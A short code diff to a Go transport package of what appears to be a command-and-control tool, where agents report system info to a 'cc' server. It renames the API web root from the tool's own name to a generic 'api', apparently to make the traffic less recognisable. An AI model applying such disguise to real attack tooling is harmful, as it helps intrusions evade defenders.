@@ -2,7 +2,7 @@ package transport
 
 const (
 	// WebRoot root path of APIs
-	WebRoot = "emp3r0r"
+	WebRoot = "api"
 	// CheckInAPI agent send POST to this API to report its system info
 	CheckInAPI = WebRoot + "/checkin"
 	// MsgAPI duplex tunnel between agent and cc
